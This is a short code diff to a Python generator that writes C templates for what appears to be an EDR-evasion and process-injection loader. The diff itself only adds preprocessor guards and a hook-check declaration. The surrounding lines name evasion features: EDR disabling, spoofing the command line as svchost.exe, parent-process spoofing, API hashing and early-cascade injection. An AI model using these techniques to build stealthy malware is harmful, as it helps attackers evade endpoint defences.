@@ -404,7 +404,9 @@ class CodeGenerator:
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
 #define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
 #define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
@@ -416,6 +418,7 @@ class CodeGenerator:
 // Output Macros
 // ============================================================================
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -427,6 +430,7 @@ class CodeGenerator:
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 // ============================================================================
 // API Hashes
@@ -792,7 +796,9 @@ int main(int argc, char** argv) {{
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
 #define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
 #define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
@@ -804,6 +810,7 @@ int main(int argc, char** argv) {{
 // Output Macros
 // ============================================================================
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -815,6 +822,7 @@ int main(int argc, char** argv) {{
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 // ============================================================================
 // API Hashes
@@ -1113,7 +1121,9 @@ __declspec(dllexport) void Run(void) {{
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
 #define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
 #define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
@@ -1125,6 +1135,7 @@ __declspec(dllexport) void Run(void) {{
 // Output Macros
 // ============================================================================
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -1136,6 +1147,7 @@ __declspec(dllexport) void Run(void) {{
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 // ============================================================================
 // API Hashes
@@ -3677,6 +3689,9 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress);
 // Pointer encoding using SharedUserData!Cookie
 LPVOID EncodeSystemPtr(LPVOID ptr);
 
+// Hook integrity check (called from main.cpp when ENABLE_HOOK_CHECK=1)
+BOOL VerifyNoHooks(VOID);
+
 // Main injection
 BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 
@@ -5725,6 +5740,7 @@ typedef struct _FILE_STANDARD_INFORMATION {
 #define ENABLE_SYSCALL_HASH 0
 #endif
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -5736,6 +5752,7 @@ typedef struct _FILE_STANDARD_INFORMATION {
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 #ifdef __cplusplus
 }
